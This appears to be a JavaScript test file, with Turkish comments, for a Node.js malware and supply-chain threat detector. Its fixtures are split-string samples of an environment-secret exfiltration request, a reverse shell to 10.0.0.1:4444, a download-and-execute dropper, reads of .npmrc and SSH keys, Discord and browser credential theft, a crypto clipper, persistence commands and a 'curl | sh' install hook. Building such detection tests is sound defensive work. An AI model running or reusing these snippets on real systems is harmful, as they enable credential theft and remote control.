// Node tehdit analizi öz-denetimi: node test/node-threat.test.js
// Örnek kodlar parçalı dizgelerden birleştirilir (antivirüs imzalarına takılmasın diye); hiçbiri çalıştırılmaz.
import assert from 'node:assert/strict';
import { nodeThreatReport, packageThreats, typosquatCandidates, effectCategory, knownFamilies, nodeIocs, NODE_EFFECT_KINDS } from '../src/node/threat.js';
import { detectTools } from '../src/core/detect.js';
import { riskScore } from '../src/core/threat.js';

const j = (...p) => p.join('');
const ids = (r) => r.classes.map((c) => c.id);
const cls = (r, id) => r.classes.find((c) => c.id === id);
const CP = j('child', '_process');

// etki türü eşlemesi: tam ad ve önek
assert.equal(effectCategory('node.exec'), 'exec');
assert.equal(effectCategory('node.fs.write.sync'), 'fsWrite');
assert.equal(effectCategory('node.env.read'), 'envRead');
assert.equal(effectCategory('dom.write'), null);
assert.ok(Object.values(NODE_EFFECT_KINDS).includes('require'));

// ortam değişkeni sızdırma (statik)
{
  const code = j("const h = require('ht", "tps'); h.request({ hostname: 'x.example' }).end(JSON.stringify(process", '.env));');
  const r = nodeThreatReport({ code });
  assert.ok(ids(r).includes('env-exfil'), ids(r).join());
  assert.ok(cls(r, 'env-exfil').evidence.some((e) => e.includes('process.env')));
}
// ortam okuma ağ olmadan sızdırma sayılmaz
assert.ok(!ids(nodeThreatReport({ code: 'console.log(process.env.HOME)' })).includes('env-exfil'));

// çalışma anı etkileri: indirici zinciri (http → yazma → çalıştırma) ve ortam okumaları
{
  const effects = [
    { seq: 1, kind: 'node.env.read', target: 'NPM_TOKEN' }, { seq: 2, kind: 'node.env.read', target: 'AWS_SECRET_ACCESS_KEY' },
    { seq: 3, kind: 'node.env.read', target: 'HOME' }, { seq: 4, kind: 'node.env.read', target: 'USER' }, { seq: 5, kind: 'node.env.read', target: 'PATH' },
    { seq: 6, kind: 'node.https.request', target: 'https://dl.example/p.bin', detail: 'GET' },
    { seq: 7, kind: 'node.fs.write', target: '/tmp/p.bin' },
    { seq: 8, kind: 'node.exec', target: '/tmp/p.bin', detail: '' },
  ];
  const r = nodeThreatReport({ code: '', effects });
  assert.ok(ids(r).includes('dropper') && cls(r, 'dropper').confidence === 'high', ids(r).join());
  assert.ok(ids(r).includes('env-exfil') && cls(r, 'env-exfil').evidence.some((e) => e.includes('NPM_TOKEN')));
  assert.equal(r.effects.envRead, 5);
  assert.ok(ids(r).includes('node-exec'));
}

// ters kabuk
{
  const code = j("var net = require('n", "et'), cp = require('", CP, "'); var s = new net.Socket(); s.connect(4444, '10.0.0.1', function () {",
    " var sh = cp.spawn('/bin/", "sh', []); s.pipe(sh.stdin); sh.stdout.pipe(s); });");
  const r = nodeThreatReport({ code });
  assert.ok(ids(r).includes('reverse-shell'), ids(r).join());
  assert.ok(riskScore(r.classes, {}).level === 'high');
}

// indirici (statik)
{
  const code = j("const https = require('https'), fs = require('fs'), { execFile } = require('", CP, "');",
    "https.get('https://raw.githubusercontent.com/x/y/main/a.exe', (r) => r.pipe(fs.createWriteStream('a.exe')).on('close', () => execFile('a.exe')));");
  const r = nodeThreatReport({ code });
  assert.ok(ids(r).includes('dropper'), ids(r).join());
  assert.deepEqual(r.iocs.downloads, ['https://raw.githubusercontent.com/x/y/main/a.exe']);
}

// kimlik dosyaları + Discord + tarayıcı + cüzdan + clipper
{
  const code = j("fs.readFileSync(path.join(os.homedir(), '.np", "mrc')); fs.readFileSync(home + '/.ss", "h/id_rsa');",
    "var p = appdata + '\\\\discord\\\\Local Storage\\\\leveldb'; var re = /[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}/;",
    "var c = local + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login ", "Data'; var k = JSON.parse(ls).os_crypt.encrypted_key;",
    "var w = /^0x[a-fA-F0-9]{40}$/; require('clipboardy').writeSync(w.test(x) ? mine : x);",
    "var e = ext + 'nkbihfbeogaeaoehlefnkodbefgpgknn';",
    "fetch('https://discord.com/api/web", "hooks/123456789012345678/abcdefghijklmnopqrstuvwxyz', { method: 'POST' });");
  const r = nodeThreatReport({ code });
  for (const id of ['credential-files', 'discord-token-stealer', 'browser-stealer', 'crypto-clipper', 'wallet-stealer', 'chat-exfil']) assert.ok(ids(r).includes(id), `${id} yok: ${ids(r).join()}`);
  assert.equal(r.iocs.discordWebhooks.length, 1);
}

// kalıcılık ve anti-analiz
{
  const code = j("exec('reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v x /d y'); exec('schtasks /cre", "ate /tn x');",
    "if (os.cpus().length < 2 || os.totalmem() < 2e9) process.exit(0); if (/VBOX|VMware/i.test(out)) process.exit(0);");
  const r = nodeThreatReport({ code });
  assert.ok(cls(r, 'persistence').evidence.length >= 2, JSON.stringify(cls(r, 'persistence')));
  assert.equal(cls(r, 'anti-analysis').confidence, 'low');
}
// tek anti-analiz işareti yetmez
assert.ok(!ids(nodeThreatReport({ code: 'if (os.cpus().length < 2) return;' })).includes('anti-analysis'));

// paket düzeyi: yaşam döngüsü + typosquatting + bağımlılık karışıklığı
{
  const pkg = { name: 'lodahs', version: '99.1.0', lifecycle: { postinstall: 'node scripts/setup.js' } };
  const p = packageThreats(pkg);
  assert.deepEqual(p.map((c) => c.id).sort(), ['dependency-confusion', 'npm-lifecycle', 'typosquatting']);
  // kurulumda çalışan dosyada tehlikeli davranış → yaşam döngüsü sınıfı yükselir
  const code = j("require('https').request({ host: 'c.example' }).end(JSON.stringify(process", '.env));');
  const r = nodeThreatReport({ code, unpack: { kind: 'npm-tgz', meta: { package: pkg, lifecycleTargets: { postinstall: ['scripts/setup.js'] } }, file: { path: 'scripts/setup.js', entry: true } } });
  assert.equal(cls(r, 'npm-lifecycle').score, 60);
  assert.equal(cls(r, 'npm-lifecycle').confidence, 'high');
  assert.deepEqual(r.file.lifecycleHooks, ['postinstall']);
  // paketin sıradan bir yardımcı dosyası paket sınıflarıyla şişirilmez
  const other = nodeThreatReport({ code: 'module.exports = 1', unpack: { kind: 'npm-tgz', meta: { package: pkg, lifecycleTargets: { postinstall: ['scripts/setup.js'] } }, file: { path: 'lib/util.js', entry: false, note: null } } });
  assert.equal(other.classes.length, 0);
  // riskli satır içi komut
  assert.equal(packageThreats({ name: 'x-internal', version: '1.0.0', lifecycle: { preinstall: j('cu', 'rl -s https://x.example/i | sh') } })[0].score, 50);
}
assert.deepEqual(typosquatCandidates('lodash'), []);
assert.ok(typosquatCandidates('expres').some((c) => c.target === 'express'));
assert.ok(typosquatCandidates('cross_env').some((c) => c.target === 'cross-env'));
assert.deepEqual(typosquatCandidates('my-unique-lib'), []);

// bilinen aileler: tek işaret düşük, ağ IOC'si yüksek güven
assert.equal(knownFamilies('flatmap-stream')[0].confidence, 'low');
assert.equal(knownFamilies(j('159.148.', '186.228 jsextension'))[0].confidence, 'high');
assert.ok(nodeThreatReport({ code: j('Shai', '-Hulud trufflehog') }).classes.some((c) => c.id === 'known-family'));

// Telegram ve paste IOC'leri
{
  const n = nodeIocs(j('https://api.telegram.org/bot123456789:', 'AAH', 'x'.repeat(33), '/sendMessage https://pastebin.com/raw/abc'));
  assert.equal(n.telegram.length >= 1, true);
  assert.deepEqual(n.pastes, ['https://pastebin.com/raw/abc']);
}

// zararsız Node kodu sınıf üretmez
assert.deepEqual(ids(nodeThreatReport({ code: "const fs = require('fs'); const d = fs.readFileSync('config.json', 'utf8'); console.log(JSON.parse(d).name);" })), []);

// paketleyici imzaları
{
  const names = (c) => detectTools(c).map((t) => t.name);
  assert.ok(names('var __nccwpck_require__ = {}; __nccwpck_require__.ab = __dirname + "/";').includes('ncc (@vercel/ncc)'));
  assert.ok(names('if (process.pkg) {}').includes('pkg (vercel/yao-pkg) izi'));
  assert.ok(names('const sea = require("node:sea"); sea.getAsset("a")').includes('Node SEA izi'));
  assert.ok(names('require("bytenode"); require("./app.jsc")').includes('bytenode yükleyici'));
  // kapsayıcı izleri pass profilini değiştirmesin (eşik 70 altı)
  assert.ok(detectTools('if (process.pkg) {} process.__nexe; require("bytenode")').filter((t) => /izi|bytenode/.test(t.name)).every((t) => t.score < 70));
}
console.log('node-threat: ok');
